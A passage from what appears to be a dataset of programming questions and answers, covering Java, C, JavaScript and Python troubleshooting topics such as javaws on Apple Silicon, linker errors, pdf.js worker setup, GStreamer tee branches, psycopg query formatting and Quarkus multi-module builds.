Please visit http://www.java.com for information on installing Java.

% which javaws
/usr/bin/javaws

% cd /Library/Java/JavaVirtualMachines/                   
JavaVirtualMachines % ls
adoptopenjdk-8.jdk

Downloads % javaws xyz.jnlp 
The operation couldn’t be completed. Unable to locate a Java Runtime that supports javaws.
Please visit http://www.java.com for information on installing Java.

Included symbolic link:
% sudo ln -sfn /opt/homebrew/opt/openjdk/libexec/openjdk.jdk /Library/Java/JavaVirtualMachines/openjdk.jdk

I've read Unable to locate a Java Runtime that supports javaws although Java 8 is installed, but the answer talks of a setting in the MacBook which is not there in M1 series.
","Well, the solution that worked was to install OpenWebStart_macos-aarch64_1_11_0.dmg from: https://openwebstart.com/download/
Once it is installed you will see settings feature in its folder. If Mac complains about Proxy, we can set ""No Proxy"" from the settings of this software.
In System Settings->Privacy and Security-> (scroll down) give it permission to run.
",java
undefined symbols for architecture  strange message,"When I compile I get a set of strange errors. 
This is what i compile with first. (This is generated from my makeFile.)
gcc -Wall -g -std=gnu99 -pedantic -c error.c -o error.o
gcc -Wall -g -std=gnu99 -pedantic -c agent.c -o agent.o
gcc -Wall -g -std=gnu99 -pedantic -c io.c -o io.o
gcc -Wall -g -std=gnu99 -pedantic -c map.c -o map.o

Then it comes down to linking it all together with my handler; I use this:
gcc -Wall -g -std=gnu99 -pedantic error.o agent.o io.o map.o handler.c -o handler

and it outputs a message that I cant find info about. Any ideas?
Undefined symbols for architecture x86_64:
    ""_m"", referenced from:
    _print_map in io.o
    _read_map in io.o
    _check_row in map.o
    _get_start_pos in map.o
    _move_one_step in map.o
    _displayMoveOnMap in map.o
    _reset_map in map.o
    ...
    (maybe you meant: _reset_map, _move_one_step , _print_map , _read_map , _main )

I think it's just a little Makefile tweak but I can't find much on these errors.
","Sounds like you've got an extern m (I don't know what type, or even if it is a function) in both io.c and map.c, but not defining it anywhere. I'd look for the extern declaration in map.h, although that's just a guess.
",c
error related to pdfworkermin says 39import39 and 39export39 cannot be used outside of module code,"I am getting this error when pushing a build to Vercel:
Failed to compile.
static/media/pdf.worker.min.50acc843.mjs from Terser
  x 'import', and 'export' cannot be used outside of module code
    ,-[18:1]
 18 |  *
 19 |  * @licend The above is the entire license notice for the
 20 |  * JavaScript code in this page
    :                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           
    `----
Caused by:
    0: failed to parse input file
    1: Syntax Error
Error: 
  x 'import', and 'export' cannot be used outside of module code
    ,-[18:1]

I tried reading here, here, here and here, but couldn't find a solution that worked for me. So basically it is somehow related to pdfjs or pdf-lib, because after installing them, it has occur.
I am using pdf-lib version 1.17.1 and pdfjs-dist version 4.5.136 (according to package.json)
This is how I use them in my code:
import { PDFDocument } from 'pdf-lib';
import * as pdfjsLib from 'pdfjs-dist';

// Polyfill for Promise.withResolvers
if (typeof Promise.withResolvers === 'undefined') {
  (Promise as any).withResolvers = function () {
    let resolve: (value: unknown) => void;
    let reject: (reason?: any) => void;
    const promise = new Promise((res, rej) => {
      resolve = res;
      reject = rej;
    });
    return { promise, resolve: resolve!, reject: reject! };
  };
}

pdfjsLib.GlobalWorkerOptions.workerSrc = new URL(
  'pdfjs-dist/legacy/build/pdf.worker.min.mjs',
  import.meta.url
).toString();

","Ok, so for everybody that struggle with that, I found the answer on this discussion. Basically use this for workerSrc:
//unpkg.com/pdfjs-dist@${pdfjsLib.version}/legacy/build/pdf.worker.min.mjs

And if you get this error:
TypeError: Promise.withResolvers is not a function

So first adding a Promise safety declarations:
declare global {
  interface PromiseConstructor {
    withResolvers<T = unknown>(): {
      promise: Promise<T>;
      resolve: (value: T | PromiseLike<T>) => void;
      reject: (reason?: any) => void;
    };
  }
}

Then I was adding a Polyfill (what is Polyfill?) for the promise. Adding a type assertion (Promise as any) to add the withResolvers method to the Promise object, and explicitly typed resolve and reject and used non-null assertions (!) when returning them, as I know they will be defined by the Promise constructor:
if (typeof Promise.withResolvers === 'undefined') {
  (Promise as any).withResolvers = function () {
    let resolve: (value: unknown) => void;
    let reject: (reason?: any) => void;
    const promise = new Promise((res, rej) => {
      resolve = res;
      reject = rej;
    });
    return { promise, resolve: resolve!, reject: reject! };
  };
}

So for me, I used pdf-lib library and implemented it like so:
import { PDFDocument } from 'pdf-lib';
import * as pdfjsLib from 'pdfjs-dist';

// Adding Promise type safety declarations
declare global {
  interface PromiseConstructor {
    withResolvers<T = unknown>(): {
      promise: Promise<T>;
      resolve: (value: T | PromiseLike<T>) => void;
      reject: (reason?: any) => void;
    };
  }
}

// Polyfill for Promise.withResolvers
if (typeof Promise.withResolvers === 'undefined') {
  (Promise as any).withResolvers = function () {
    let resolve: (value: unknown) => void;
    let reject: (reason?: any) => void;
    const promise = new Promise((res, rej) => {
      resolve = res;
      reject = rej;
    });
    return { promise, resolve: resolve!, reject: reject! };
  };
}

pdfjsLib.GlobalWorkerOptions.workerSrc = `//unpkg.com/pdfjs-dist@${pdfjsLib.version}/legacy/build/pdf.worker.min.mjs`;

Hope that helpes!
",javascript
float and double datatype in java,"The float data type is a single-precision 32-bit IEEE 754 floating point and the double data type is a double-precision 64-bit IEEE 754 floating point.
What does it mean? And when should I use float instead of double or vice-versa?
","The Wikipedia page on it is a good place to start.
To sum up:

float is represented in 32 bits, with 1 sign bit, 8 bits of exponent, and 23 bits of the significand (or what follows from a scientific-notation number:  2.33728*1012; 33728 is the significand).
double is represented in 64 bits, with 1 sign bit, 11 bits of exponent, and 52 bits of significand.

By default, Java uses double to represent its floating-point numerals (so a literal 3.14 is typed double).  It's also the data type that will give you a much larger number range, so I would strongly encourage its use over float.
There may be certain libraries that actually force your usage of float, but in general - unless you can guarantee that your result will be small enough to fit in float's prescribed range, then it's best to opt with double.
If you require accuracy - for instance, you can't have a decimal value that is inaccurate (like 1/10 + 2/10), or you're doing anything with currency (for example, representing $10.33 in the system), then use a BigDecimal, which can support an arbitrary amount of precision and handle situations like that elegantly.
",java
how does 39ls39 sort filenames,"I'm trying to write a function that mimics the output of the ls command in Unix. I was originally trying to perform this using scandir and alphasort, and this did indeed print the files in the directory, and it did sort them, but for some reason, this sorted list does not seem to match the same ""sorted list"" of filenames that ls gives.
For example, if I have a directory that contains file.c, FILE.c, and ls.c.
ls displays them in the order: file.c FILE.c ls.c.
But when I sort it using alphasort/scandir, it sorts them as: FILE.c file.c ls.c
How does ls sort the files in the directory such that it gives such a differently ordered result?
","To emulate default ls -1 behaviour, make your program locale-aware by calling
setlocale(LC_ALL, """");

near the beginning of your main(), and use
count = scandir(dir, &array, my_filter, alphasort);

where my_filter() is a function that returns 0 for names that begin with a dot ., and 1 for all others. alphasort() is a POSIX function that uses the locale collation order, same order as strcoll().
The basic implementation is something along the lines of
#define  _POSIX_C_SOURCE 200809L
#define  _ATFILE_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <locale.h>
#include <string.h>
#include <dirent.h>
#include <stdio.h>
#include <errno.h>

static void my_print(const char *name, const struct stat *info)
{
    /* TODO: Better output; use info too, for 'ls -l' -style output? */
    printf(""%s\n"", name);
}

static int my_filter(const struct dirent *ent)
{
    /* Skip entries that begin with '.' */
    if (ent->d_name[0] == '.')
        return 0;

    /* Include all others */
    return 1;
}

static int my_ls(const char *dir)
{
    struct dirent **list = NULL;
    struct stat     info;
    DIR            *dirhandle;
    int             size, i, fd;

    size = scandir(dir, &list, my_filter, alphasort);
    if (size == -1) {
        const int cause = errno;

        /* Is dir not a directory, but a single entry perhaps? */
        if (cause == ENOTDIR && lstat(dir, &info) == 0) {
            my_print(dir, &info);
            return 0;
        }

        /* Print out the original error and fail. */
        fprintf(stderr, ""%s: %s.\n"", dir, strerror(cause));
        return -1;
    }

    /* We need the directory handle for fstatat(). */
    dirhandle = opendir(dir);
    if (!dirhandle) {
        /* Print a warning, but continue. */
        fprintf(stderr, ""%s: %s\n"", dir, strerror(errno));
        fd = AT_FDCWD;
    } else {
        fd = dirfd(dirhandle);
    }

    for (i = 0; i < size; i++) {
        struct dirent *ent = list[i];

        /* Try to get information on ent. If fails, clear the structure. */
        if (fstatat(fd, ent->d_name, &info, AT_SYMLINK_NOFOLLOW) == -1) {
            /* Print a warning about it. */
            fprintf(stderr, ""%s: %s.\n"", ent->d_name, strerror(errno));
            memset(&info, 0, sizeof info);
        }

        /* Describe 'ent'. */
        my_print(ent->d_name, &info);
    }

    /* Release the directory handle. */
    if (dirhandle)
        closedir(dirhandle);

    /* Discard list. */
    for (i = 0; i < size; i++)
        free(list[i]);
    free(list);

    return 0;
}

int main(int argc, char *argv[])
{
    int arg;

    setlocale(LC_ALL, """");

    if (argc > 1) {
        for (arg = 1; arg < argc; arg++) {
            if (my_ls(argv[arg])) {
                return EXIT_FAILURE;
            }
        }
    } else {
        if (my_ls(""."")) {
            return EXIT_FAILURE;
        }
    }

    return EXIT_SUCCESS;
}

Note that I deliberately made this more complex than strictly needed for your purposes, because I did not want you to just copy and paste the code. It will be easier for you to compile, run, and investigate this program, then port the needed changes -- possibly just the one setlocale("""", LC_ALL); line! -- to your own program, than try and explain to your teacher/lecturer/TA why the code looks like it was copied verbatim from somewhere else.
The above code works even for files specified on the command line (the cause == ENOTDIR part). It also uses a single function, my_print(const char *name, const struct stat *info) to print each directory entry; and to do that, it does call stat for each entry.
Instead of constructing a path to the directory entry and calling lstat(), my_ls() opens a directory handle, and uses fstatat(descriptor, name, struct stat *, AT_SYMLINK_NOFOLLOW) to gather the information in basically the same manner as lstat() would, but name being a relative path starting at the directory specified by descriptor (dirfd(handle), if handle is an open DIR *).
It is true that calling one of the stat functions for each directory entry is ""slow"" (especially if you do /bin/ls -1 style output). However, the output of ls is intended for human consumption; and very often piped through more or less to let the human view it at leisure. This is why I would personally do not think the ""extra"" stat() call (even when not really needed) is a problem here. Most human users I know of tend to use ls -l or (my favourite) ls -laF --color=auto anyway. (auto meaning ANSI colors are used only if standard output is a terminal; i.e. when isatty(fileno(stdout)) == 1.)
In other words, now that you have the ls -1 order, I would suggest you modify the output to be similar to ls -l (dash ell, not dash one). You only need to modify my_print() for that.
",c
in gstreamer adding and removing queue of a tee dynamically,"I have written gstreamer code for camera live-streaming and recording at the same time.
My pipeline looks like that:
                 /  [ queue1 | videosink ]           
v4l2src | tee         
                 \  [ queue2 | filesink ]        

Currently both live streaming and file recording is working together.
Now I need to start the pipeline with only one queue i.e. queue1 (live streaming queue), After a while I need to add the recording queue and remove it dynamically too.
My working code are given below:
pipeline = gst_pipeline_new (""rv_camera"");
    
/*Create source element. We use mfw_v4lsrc from Freescale as source */

source= gst_element_factory_make (GSTREAMER_SOURCE,""camera-source"");
g_object_set(G_OBJECT(source),""device"",camDeviceName, (char *)0);

/*Set default properties of mfw_v4lsrc */
g_object_set(G_OBJECT(source),""capture-width"", CAMERA_CAPTURE_WIDTH,
                              ""capture-height"", CAMERA_CAPTURE_HEIGHT,
                              ""sensor-width"", CAMERA_SENSOR_WIDTH,
                              ""sensor-height"", CAMERA_SENSOR_HEIGHT,
                              ""preview"", CAMERA_PREVIEW_DISPLAY,
                              ""preview-width"",CAMERA_PREVIEW_WIDTH,
                              ""preview-height"",CAMERA_PREVIEW_HEIGHT,
                              ""fps-n"",CAMERA_FRAMERATE,
                              ""rotate"",mirror_effect,
                              (char *)0);


/* Tee that copies the stream to multiple outputs */
    tee = gst_element_factory_make(""tee"", ""tee"");

    /* Queue creates new thread for the stream */
    screen_queue = gst_element_factory_make(""queue"", ""screen_queue"");

/*Create sink element. We use mfw_v4lsink from Freescale as sink. fbdevsink is not used as
  it directly writes into framebuffer which is not desired*/
sink= gst_element_factory_make (GSTREAMER_SINK,""video-output"");

capture_queue = gst_element_factory_make(""queue"", ""capture_queue"");

encoder = gst_element_factory_make(""mfw_vpuencoder"", ""encoder"");
g_object_set(G_OBJECT(encoder),""codec-type"",0,
                               ""mirror-direction"",0,
                                (char *)0);

clockoverlay = gst_element_factory_make(""clockoverlay"", ""Timestamp"");
g_object_set(G_OBJECT(clockoverlay),""time-format"",""%R %d-%b-%Y"", (char *)0);

avimux = gst_element_factory_make(""avimux"", ""avimux"");

filesink = gst_element_factory_make(""filesink"", ""file-output"");
g_object_set(G_OBJECT(filesink),""location"",""/KPIT/OBITS/Blackbox/OBITS-SCNLog.avi"", (char *)0);



/* Check if all elements are created or not*/
if (!pipeline || !source || !tee || !screen_queue || !sink || !capture_queue || !clockoverlay || !encoder || !avimux || !filesink) {
    LOGERR((TEXT(""GstreamerStream :: camInit: 1 One or more element(s) could not be created .... logerr\n"")));
    return CAM_STATUS_INIT_FAIL;
}

/* we add all elements into the pipeline */
gst_bin_add_many (GST_BIN (pipeline),source,tee,screen_queue, sink, capture_queue,clockoverlay,encoder,avimux,filesink, (char *)0);

/* we link the elements together */
if( gst_element_link_many( source, tee, NULL ) &&  gst_element_link_many( tee,screen_queue,sink, NULL ) &&
       gst_element_link_many( tee,capture_queue,clockoverlay,encoder,avimux,filesink, NULL ))
{
     bus = gst_pipeline_get_bus(GST_PIPELINE(pipeline));

    /*Add watch to look for error events */
    gst_bus_add_watch(bus, process_events, this);

    gst_object_unref(bus);

    }
    gst_element_set_state (pipeline, GST_STATE_PLAYING);

Kindly let me know the way, I can add or remove any queue dynamically.
I'd appreciate your help if someone can provide sample code related to this.
","Keep the tee in the pipeline and you can request/release pads from the tee at any time during playback. Request the pad and add your new elements to the pipeline, link them, and set them to playing, too. When you are done, unlink this branch and remember to send EOS to it to have the recording properly finished. After you receive the EOS message from the filesink you can shutdown, remove and unref the branch you unlinked.
If you are using 0.10 (don't use it, move to 1.0), then you might need to send a segment event to the new branch once you add it.
",c
mapstruct check null,"I want to check null in method
@Override
public void updateFooFromNonNullAttributesOfDto(FooDto fooDto, Foo foo) {
        if ( fooDto== null ) {
            return;
        }
        if ( fooDto.getBar() != null ) {
            site.setBar( fooDto.getBar() );
        }
         if ( fooDto.getBaz() != null ) {
            site.setBar( fooDto.getBaz() );
        }
}

When I use
@Mapper(NullValueCheckStrategy.ALWAYS)

It's check in all methods, but I want check only in one...
How to solve this problem?
","This is not yet possible with MapStruct, you can either do for all or for none. There is already a feature request for the exact same thing. See 1243
",java
plus  operator semantics in c,"Today I noticed that the weird b + + c; expression is considered valid in C. I am wondering if there is a reason behind it; especially, given that b ++ c; and b + ; are considered syntax errors.
I do not know where to look for some information, I thought StackOverflow might be a good place to ask for some insight (I am using gcc for compilation).
I found this expression in an old code of mine, probably an error caused due to removing a variable from the middle of the summation and forgetting to also remove the operator sign.
#include <stdio.h>
int main()
{
    int a = 100;
    int b = 200;
    int c = 300;
    a = b + + c; /* <-- why this is not a syntax error ? */
    printf(""a = %d\n"", a); /* <-- prints a = 500 */
    return 0;
}

","b + + c is equivalent to b + (+c) where the second + is an unary plus operation that actually does nothing here.
(a bit similar to -c for unary negation but with no real effect).
This is because of the operator precedence: unary + - has higher precedence than binary + -.
As @RobertHarvey commented you should not actually write code like this as there's no reason to over-complicate a simple a = b + c;.
",c
spring boot application not starting error stopping service tomcat,"I am not able to run my Spring Boot application with embedded Tomcat. It was working fine till now and I did not make any changes in configuration. When i run the application as Spring Boot App in eclipse the tomcat stops immediately during startup.
SLF4J: Failed to load class ""org.slf4j.impl.StaticLoggerBinder"".
SLF4J: Defaulting to no-operation (NOP) logger implementation
SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.
2019-02-06 14:12:20,103 restartedMain ERROR Console contains an invalid element or attribute """"

  .   ____          _            __ _ _
 /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
( ( )\___ | '_ | '_| | '_ \/ _` | \ \ \ \
 \\/  ___)| |_)| | | | | || (_| |  ) ) ) )
  '  |____| .__|_| |_|_| |_\__, | / / / /
 =========|_|==============|___/=/_/_/_/
 :: Spring Boot ::        (v1.5.6.RELEASE)

Feb 06, 2019 2:12:23 PM org.apache.catalina.core.StandardService startInternal
INFO: Starting service [Tomcat]
Feb 06, 2019 2:12:23 PM org.apache.catalina.core.StandardEngine startInternal
INFO: Starting Servlet Engine: Apache Tomcat/8.5.16
Feb 06, 2019 2:12:24 PM org.apache.jasper.servlet.TldScanner scanJars
INFO: At least one JAR was scanned for TLDs yet contained no TLDs. Enable debug logging for this logger for a complete list of JARs that were scanned but no TLDs were found in them. Skipping unneeded JARs during scanning can improve startup time and JSP compilation time.
Feb 06, 2019 2:12:24 PM org.apache.catalina.core.ApplicationContext log
INFO: Initializing Spring embedded WebApplicationContext
2019-02-06 14:12:24.946  INFO 9504 --- [  restartedMain] o.h.j.i.u.LogHelper                      : HHH000204: Processing PersistenceUnitInfo [
    name: default
    ...]
2019-02-06 14:12:25.031  INFO 9504 --- [  restartedMain] o.h.Version                              : HHH000412: Hibernate Core {5.0.12.Final}
2019-02-06 14:12:25.034  INFO 9504 --- [  restartedMain] o.h.c.Environment                        : HHH000206: hibernate.properties not found
2019-02-06 14:12:25.036  INFO 9504 --- [  restartedMain] o.h.c.Environment                        : HHH000021: Bytecode provider name : javassist
2019-02-06 14:12:25.089  INFO 9504 --- [  restartedMain] o.h.a.c.Version                          : HCANN000001: Hibernate Commons Annotations {5.0.1.Final}
2019-02-06 14:12:25.410  INFO 9504 --- [  restartedMain] o.h.d.Dialect                            : HHH000400: Using dialect: org.hibernate.dialect.MySQL5Dialect
Feb 06, 2019 2:12:27 PM org.apache.catalina.core.StandardService stopInternal
INFO: Stopping service [Tomcat]

I tried restarting machine, eclipse, refreshing project, recreate the .m2 repositories but it did not help me solve the problem.
Below is my configuration information:
Main Class
@SpringBootApplication
@PropertySource(value=""classpath:messages.properties"")
public class ExampleApplication {

    public static void main(String[] args) {
        SpringApplication.run(ExampleApplication.class,       args);
    }

}

Pom.xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<project xmlns=""http://maven.apache.org/POM/4.0.0""
    xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
    xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.brokerswing</groupId>
    <artifactId>brokerswing</artifactId>
    <version>1.1</version>

    <name>Example</name>
    <description>-</description>

    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>1.5.6.RELEASE</version>
        <relativePath />
    </parent>

    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
        <java.version>1.8</java.version>
    </properties>

    <dependencies>
        <!-- Spring Web -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
            <exclusions>
                <exclusion>
                    <groupId>org.springframework.boot</groupId>
                    <artifactId>spring-boot-starter-logging</artifactId>
                </exclusion>
            </exclusions>
        </dependency>

        <!-- Spring Data JPA -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-data-jpa</artifactId>
        </dependency>

        <!-- Spring Email -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-mail</artifactId>
        </dependency>

        <!-- Spring Security -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-security</artifactId>
        </dependency>

        <!-- Spring Development Tools -->
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-devtools</artifactId>
            <optional>true</optional>
        </dependency>

        <!-- MySQL -->
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <scope>runtime</scope>
        </dependency>

        <!-- Servlet+JSP+JSTL -->
        <dependency>
            <groupId>javax.servlet</groupId>
            <artifactId>jstl</artifactId>
        </dependency>

        <!-- Need this to compile JSP -->
        <dependency>
            <groupId>org.apache.tomcat.embed</groupId>
            <artifactId>tomcat-embed-jasper</artifactId>
            <scope>provided</scope>
        </dependency>

        <dependency>
            <groupId>org.codehaus.jackson</groupId>
            <artifactId>jackson-mapper-asl</artifactId>
            <version>1.9.13</version>
        </dependency>

        <!-- Commons Collection -->
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
        </dependency>

        <!-- Simple Java Mail -->
        <!-- <dependency> <groupId>org.simplejavamail</groupId> <artifactId>simple-java-mail</artifactId> 
            <version>4.4.5</version> </dependency> -->

        <!-- Java Mail and JAF -->
        <dependency>
            <groupId>javax.mail</groupId>
            <artifactId>mail</artifactId>
            <version>1.4.7</version>
            <scope>provided</scope>
        </dependency>

        <!-- Apache Velocity -->
        <dependency>
            <groupId>org.apache.velocity</groupId>
            <artifactId>velocity</artifactId>
            <version>1.7</version>
        </dependency>

        <!-- Apache Log4j 2 -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
        </dependency>
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-jcl</artifactId>
        </dependency>

        <!-- Excel library -->
        <dependency>
            <groupId>org.apache.poi</groupId>
            <artifactId>poi</artifactId>
            <version>3.6</version>
        </dependency>
        <dependency>
            <groupId>org.apache.poi</groupId>
            <artifactId>poi-ooxml</artifactId>
            <version>3.6</version>
        </dependency>

    </dependencies>

    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>

            <plugin>
                <groupId>org.apache.maven.plugins</groupId>
                <artifactId>maven-compiler-plugin</artifactId>
                <configuration>
                    <source>1.8</source>
                    <target>1.8</target>
                </configuration>
            </plugin>
        </plugins>
    </build>

    <packaging>war</packaging>

</project>

Application.properties
# IDENTITY (ContextIdApplicationContextInitializer)
spring.application.name=Example

server.port=80
#debug=true

# SPRING MVC (WebMvcProperties)
spring.mvc.date-format=DD/MM/YYYY

# JDBC Connection
spring.datasource.driverClassName=com.mysql.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost:3306/brokerswing?useSSL=false
spring.datasource.username=root
spring.datasource.password=root


# JPA (JpaBaseConfiguration, HibernateJpaAutoConfiguration)
spring.jpa.hibernate.ddl-auto=none
spring.jpa.show-sql=false   
spring.jpa.properties.hibernate.dialect = org.hibernate.dialect.MySQL5Dialect
spring.jpa.properties.hibernate.current_session_context_class=org.springframework.orm.hibernate5.SpringSessionContext


# DEVTOOLS (DevToolsProperties)
spring.devtools.restart.enabled=true
spring.devtools.restart.exclude=META-INF/maven/**,META-INF/resources/**,resources/**,static/**,public/**,templates/**,**/*Test.class,**/*Tests.class,git.properties,META-INF/build-info.properties
spring.devtools.restart.poll-interval=5000
spring.devtools.restart.quiet-period=1000

","The error you get seems related to SLF4J
Try adding the below dependencies in your pom.xml
  <dependency>
       <groupId>org.slf4j</groupId>
       <artifactId>slf4j-api</artifactId>
       <version>1.7.5</version>
   </dependency>
   <dependency>
       <groupId>org.slf4j</groupId>
       <artifactId>slf4j-log4j12</artifactId>
       <version>1.7.5</version>
   </dependency>

",java
how to solve quot cmsys64mingw64binpythonexe can39t open file quot error,"I am getting error when I want to run my python script in terminal which says...
C:\msys64\mingw64\bin\python.exe: can't open file

Possible Problem Cause:
I have installed MSYS2 in my machine so that I can use g++ and gcc compilers for C/C++ Programs and to use g++ and gcc I needed to add C:\msys64\mingw64\bin path to system environment variables.
C:\msys64\mingw64\bin folder has python.exe in it; so I am guessing that it is causing some kind of collision between my python interpreter and C:\msys64\mingw64\bin's python.exe
When I remove C:\msys64\mingw64\bin path from system Environment variables, I am getting expected output.
What do I want?
I want a solution in which I can keep using both, python and g++/gcc.
","I reordered paths in System/User's environmental variables and now I am getting what I needed.
",python
chartjs  writing labels inside of horizontal bars,"In Chart.js, is there any way to write the labels inside of the horizontal bars in a ""horizontalBar"" chart? As in something like:
 
Is anything similar to this possible in Chart.js?
Thanks!
","There is now on option ""mirror"" to make the label appear inside the bar.
Example of ""options"" config for a horizontalBar chart :
options: {
    scales: {
        yAxes: [{ticks: {mirror: true}}]
    }
}

Doc : http://www.chartjs.org/docs/latest/axes/cartesian/#common-configuration
",javascript
const usage with pointers in c,"I am going over C and have a question regarding const usage with pointers.  I understand the following code:
const char *someArray

This is defining a pointer that points to types of char and the const modifier means that the values stored in someArray cannot be changed.  However, what does the following mean?
char * const array

Is this an alternate way of specifying a parameter that is a char pointer to an array named ""array"" that is const and cannot be modified? 
Lastly, what does this combination mean:
const char * const s2

For reference, these are taken from the Deitel C programming book in Chapter 7 and all of these are used as parameters passed to functions.
","const char* is, as you said, a pointer to a char, where you can't change the value of the char (at least not through the pointer (without casting the constness away)).
char* const is a pointer to a char, where you can change the char, but you can't make the pointer point to a different char.
const char* const is a constant pointer to a constant char, i.e. you can change neither where the pointer points nor the value of the pointee.
",c
named argument passed as a dict syntaxerror syntax error at or near quotquot or syntaxerror type modifiers must be simple constants or identifiers,"I'm facing some troubles when trying to execute a PostgreSQL CREATE TABLE query with a dictionary of parameters using psycopg:
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
""""""
Created on Fri Nov  1 09:32:32 2024

@author: me
""""""

import psycopg

pg_uri = ""postgres://postgres:******@localhost:5432/mydatabase""
conn_dict = psycopg.conninfo.conninfo_to_dict(pg_uri)
conn = psycopg.connect(**conn_dict)
curs = conn.cursor()

d = {""CRS"": 4326}
raw = ""CREATE TABLE foo (id INT, geom geometry('Point',%(CRS)s));""

query0 = psycopg.sql.SQL(raw).format(**d)
query1 = psycopg.sql.SQL(raw.format(**d))
query2 = psycopg.sql.SQL(raw)

curs.execute(query0) # SyntaxError: syntax error at or near ""%""
curs.execute(query1) # SyntaxError: syntax error at or near ""%""
curs.execute(query2,d) # SyntaxError: type modifiers must be simple constants or identifiers


The curs.execute() calls either raise:

SyntaxError: syntax error at or near ""%"" with the two firsts queries or:
SyntaxError: type modifiers must be simple constants or identifiers with the last one

Relevant pieces of documentation
https://www.psycopg.org/psycopg3/docs/basic/params.html
Version Info
Python: 3.10
psycopg: 3.2.3
PostgreSQL: 16
","As the documentation for SQL.format states, SQL.format uses the same placeholder syntax as str.format, i.e. {CRS} and not %(CRS)s.
d = {""CRS"": 4326}
raw = ""CREATE TABLE foo (id INT, geom geometry('Point',{CRS}));""

query0 = psycopg.sql.SQL(raw).format(**d)

",python
mixed multimodule maven project with quarkus and nonquarkus modules  is there a way to run smoothly on dev mode,"The applied solution is at the bottom of the question

So I have a Quarkus project that I want to run in dev mode with mvn quarkus:dev.
I have a mixed project that contains one Quarkus module and a non-Quarkus project that is pure Java.
Let us call them module1 (non-quarkus) and module2 (quarkus). The module2 have a dependency on module1.
When I execute
$ cd module2
$ mvn quarkus:dev

The following error occurs:

[ERROR] Failed to execute goal on project module2: Could not resolve
dependencies for project xxx:module2:jar:1.0: The following artifacts
could not be resolved: xxx.root:module1:jar:1.0 (absent):
xxx.root:module1:jar:1.0 was not found in
https://repo.maven.apache.org/maven2 during a previous attempt. This
failure was cached in the local repository and resolution is not
reattempted until the update interval of central has elapsed or
updates are forced

Okay, the dependencies are not set because module1 is not locally installed and could not be resolved remotely. When I do mvn clean install on module1 and on the root, I can finally do mvn quarkus:dev inside module2's folder.
Is there anyway to have a smoother experience? I mean, if I'm constantly changing module1, will I have to always do mvn clean install?
My project structure looks like this:
root
├── module1 (non quarkus project)
└── module2 (quarkus project)

root's pom.xml
<project xmlns=""http://maven.apache.org/POM/4.0.0"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>
    <groupId>xxx</groupId>
    <artifactId>root</artifactId>
    <version>1.0</version>
    <packaging>pom</packaging>
    <modules>
        <module>module1</module>
        <module>module2</module>
    </modules>
</project>

module1's pom.xml
<project xmlns=""http://maven.apache.org/POM/4.0.0""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>xxx</groupId>
        <artifactId>root</artifactId>
        <version>1.0</version>
    </parent>

    <artifactId>module1</artifactId>

    <properties>
        <maven.compiler.source>21</maven.compiler.source>
        <maven.compiler.target>21</maven.compiler.target>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    </properties>

</project>


module2's pom.xml
<project xmlns=""http://maven.apache.org/POM/4.0.0""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"">
    <modelVersion>4.0.0</modelVersion>
    <parent>
        <groupId>xxx</groupId>
        <artifactId>root</artifactId>
        <version>1.0</version>
    </parent>

    <artifactId>module2</artifactId>

    <properties>
        <compiler-plugin.version>3.13.0</compiler-plugin.version>
        <maven.compiler.release>21</maven.compiler.release>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
        <project.reporting.outputEncoding>UTF-8</project.reporting.outputEncoding>
        <quarkus.platform.artifact-id>quarkus-bom</quarkus.platform.artifact-id>
        <quarkus.platform.group-id>io.quarkus.platform</quarkus.platform.group-id>
        <quarkus.platform.version>3.17.7</quarkus.platform.version>
